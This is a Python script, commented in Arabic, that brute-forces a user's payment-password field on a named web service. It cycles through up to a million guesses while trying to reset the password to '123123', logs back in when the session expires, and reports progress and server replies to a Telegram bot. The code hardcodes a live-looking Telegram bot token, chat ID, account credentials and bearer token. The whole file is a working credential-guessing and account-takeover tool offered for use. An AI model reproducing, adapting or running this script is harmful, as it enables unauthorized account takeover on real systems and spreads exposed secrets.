import requests
import json
import threading
import time
from concurrent.futures import ThreadPoolExecutor

# بيانات تيليجرام
telegram_bot_token = "6724140823:AAE1pkFDNCAaKa1ahmXan8EJGyCNoTFTpg0"
telegram_chat_id = "1701465279"

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# معرّف الرسالة الحية
live_message_id = None
progress_lock = threading.Lock()

# ملف التقدم
progress_file = "progress.txt"

# تحميل آخر تقدم
try:
    with open(progress_file, "r", encoding="utf-8") as f:
        last_progress = int(f.read().strip())
except (FileNotFoundError, ValueError):
    last_progress = 0  

# التوكن المستخدم في الطلبات
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# رأس الطلبات (Headers)
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',
}

# دالة إعادة تسجيل الدخول
def relogin():
    global token
    print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
    
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]
                print(f"✅ تم الحصول على التوكن الجديد: {token}")
                return True
        print(f"❌ فشل الحصول على التوكن! الرد: {result}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
    return False

# دالة إرسال أو تحديث رسالة تيليجرام
def send_or_update_telegram_message(current, total, last_response):
    global live_message_id

    formatted_response = json.dumps(last_response, indent=2, ensure_ascii=False)

    message = f"""
<b>𝗕𝗟𝗔𝗖𝗞 𓃠 | حالة التخمين 🔥</b>

📊 <b>التقدم:</b> {current}/{total} كلمة مرور تمت تجربتها
📩 <b>آخر رد من السيرفر:</b>
<pre>{formatted_response}</pre>
"""

    url_send = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    url_edit = f"https://api.telegram.org/bot{telegram_bot_token}/editMessageText"

    with progress_lock:
        if live_message_id is None:
            data = {"chat_id": telegram_chat_id, "text": message, "parse_mode": "HTML"}
            try:
                response = requests.post(url_send, json=data)
                response_json = response.json()
                if response_json.get("ok"):
                    live_message_id = response_json["result"]["message_id"]
            except requests.exceptions.RequestException as e:
                print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")
        else:
            data = {"chat_id": telegram_chat_id, "message_id": live_message_id, "text": message, "parse_mode": "HTML"}
            try:
                requests.post(url_edit, json=data)
            except requests.exceptions.RequestException as e:
                print(f"⚠️ خطأ أثناء تحديث رسالة تيليجرام: {e}")

# دالة تجربة كلمة المرور
def try_password(password_index, total_passwords):
    global token, headers

    o_payword = f"password-{password_index}"

    data = {
        'o_payword': o_payword,
        'n_payword': '123123',
        'r_payword': '123123',
        'lang': 'eg',
        'token': token,
    }

    url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
    try:
        response = requests.post(url, json=data, headers=headers)
        response_json = response.json()

        print(f"🔹 تجربة كلمة المرور: {o_payword}")
        print(f"🔹 رد السيرفر: {json.dumps(response_json, indent=2, ensure_ascii=False)}")

        # إذا انتهت الجلسة، أعد تسجيل الدخول وحاول مجددًا
        if response_json.get("code") in [203, 204]:
            print("⚠️ الجلسة انتهت، سيتم تسجيل الدخول مرة أخرى...")
            if relogin():
                headers['Authorization'] = f'Bearer {token}'  
                print("🔄 إعادة المحاولة باستخدام نفس كلمة المرور...")
                try_password(password_index, total_passwords)
            return

        # تحديث تيليجرام
        send_or_update_telegram_message(password_index, total_passwords, response_json)

        # تحديث ملف التقدم
        with open(progress_file, "w", encoding="utf-8") as f:
            f.write(str(password_index))

    except requests.exceptions.RequestException as e:
        print(f"⚠️ حدث خطأ أثناء إرسال الطلب: {e}")

# تشغيل التخمين مع 3 Threads
def start_password_testing():
    total_passwords = 1000000  
    NUM_THREADS = 1

    with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
        executor.map(lambda i: try_password(i, total_passwords), range(last_progress + 1, total_passwords + 1))

# تشغيل التخمين
start_password_testing()
